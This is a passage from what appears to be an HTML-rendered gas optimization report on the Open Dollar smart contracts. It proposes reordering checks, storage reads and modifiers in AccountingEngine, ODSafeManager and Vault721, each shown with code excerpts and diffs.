href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/UniV3Relayer.sol#L23\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/UniV3Relayer.sol#L23</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">oracles</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV3Relayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L26\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L26</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-02-avoid-making-external-calls-if-we-dont-have-to\" style=\"position:relative;\"><a href=\"#g-02-avoid-making-external-calls-if-we-dont-have-to\" aria-label=\"g 02 avoid making external calls if we dont have to permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Avoid making external calls if we don’t have to</h2>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L175-L181\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L175-L181</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AccountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">auctionDebt</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debtAuctionBidSize</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AccEng_DebtAuctionDisabled</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coinBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">coinBalance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_debtBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">.</span><span class=\"mtk11\">debtBalance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debtAuctionBidSize</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_unqueuedUnauctionedDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_debtBalance</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AccEng_InsufficientDebt</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>The if statement on the line 182 only depends on the variable <code>_debtBalance</code> and therefore we do not need to load <code>_coinBalance</code> before performing the check.\nIn case of a revert on the if check, the gas used to do the external call <code>safeEngine.coinBalance(address(this));</code> would be wasted. We can minimize this cost by performing the check earlier as shown below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/AccountingEngine.sol b/src/contracts/AccountingEngine.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0f96326..1735f93 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/AccountingEngine.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/AccountingEngine.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -175,10 +175,10 @@ contract AccountingEngine is Authorizable, Modifiable, Disableable, IAccountingE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function auctionDebt() external returns (uint256 _id) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (_params.debtAuctionBidSize == 0) revert AccEng_DebtAuctionDisabled();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 _coinBalance = safeEngine.coinBalance(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 _debtBalance = safeEngine.debtBalance(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (_params.debtAuctionBidSize &gt; _unqueuedUnauctionedDebt(_debtBalance)) revert AccEng_InsufficientDebt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _coinBalance = safeEngine.coinBalance(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     (_coinBalance, _debtBalance) = _settleDebt(_coinBalance, _debtBalance, _coinBalance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     totalOnAuctionDebt += _params.debtAuctionBidSize;</span></span></span></code></pre>\n<h2 id=\"g-03-avoid-making-any-state-reads-if-we-can-revert-early-save-2100-gas\" style=\"position:relative;\"><a href=\"#g-03-avoid-making-any-state-reads-if-we-can-revert-early-save-2100-gas\" aria-label=\"g 03 avoid making any state reads if we can revert early save 2100 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Avoid Making any state reads if we can revert early (Save 2100 Gas)</h2>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136-L152\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136-L152</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferSAFEOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault721</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;SafeMngr: Only Vault721&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ZeroAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadySafeOwner</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Avoid reading from storage if we might revert early. The first check involves making a state read, <code>vault721</code>\nThe second check, the if statement, checks if  a function parameter <code>_dst</code>  is equal to <code>address(0)</code> and reverts if it happens to be zero.\nAs it is, if <code>_dst</code> is zero address, we would consume gas in the require statement to make the state read(2100 Gas for the state read) and then revert on the second check\nwe can save some gas in the case of such a revert by moving the cheap check to the top and only reading state variable after validating the function parameter.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/ODSafeManager.sol b/src/contracts/proxies/ODS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">afeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b3ab2f5..33cc7db 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -134,9 +134,10 @@ contract ODSafeManager is IODSafeManager {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   // Give the safe ownership to a dst address.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function transferSAFEOwnership(uint256 _safe, address _dst) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (_dst == address(0)) revert ZeroAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(msg.sender == address(vault721), &#39;SafeMngr: Only Vault721&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (_dst == address(0)) revert ZeroAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (_dst == _sData.owner) revert AlreadySafeOwner();</span></span></span></code></pre>\n<h2 id=\"g-04-variable-already-cached-but-in-the-wrong-order---refactor-to-save-1-sload100-gas\" style=\"position:relative;\"><a href=\"#g-04-variable-already-cached-but-in-the-wrong-order---refactor-to-save-1-sload100-gas\" aria-label=\"g 04 variable already cached but in the wrong order   refactor to save 1 sload100 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Variable already cached but in the wrong order - refactor to save 1 SLOAD(100 Gas)</h2>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L94-L99\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L94-L99</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;V721: only safeManager&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxyRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;V721: non-native proxy&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_proxyRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_safeMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function mint(address _proxy, uint256 _safeId) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(msg.sender == address(safeManager), &#39;V721: only safeManager&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    require(_proxyRegistry[_proxy] != address(0), &#39;V721: non-native proxy&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address _user = _proxyRegistry[_proxy];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+     address _user = _proxyRegistry[_proxy];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(_user != address(0), &#39;V721: non-native proxy&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _safeMint(_user, _safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-05-modifier-execution-order-can-help-save-an-entire-sloadsave-2100-gas\" style=\"position:relative;\"><a href=\"#g-05-modifier-execution-order-can-help-save-an-entire-sloadsave-2100-gas\" aria-label=\"g 05 modifier execution order can help save an entire sloadsave 2100 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Modifier execution order can help save an entire SLOAD(Save 2100 Gas)</h2>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L104-L114\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L104-L114</a></p>\n<p><strong>Note: This would only make sense if <code>governor</code> remains a state variable, bot has suggested making it immutable.</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateNftRenderer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">105:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_nftRenderer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">106:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_oracleRelayer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">107:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_taxCollector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">108:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateralJoinFactory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGovernor</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oracleRelayer</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_taxCollector</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateralJoinFactory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_setNftRenderer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nftRenderer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">nftRenderer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setImplementation</span><span class=\"mtk1\">(</span><span 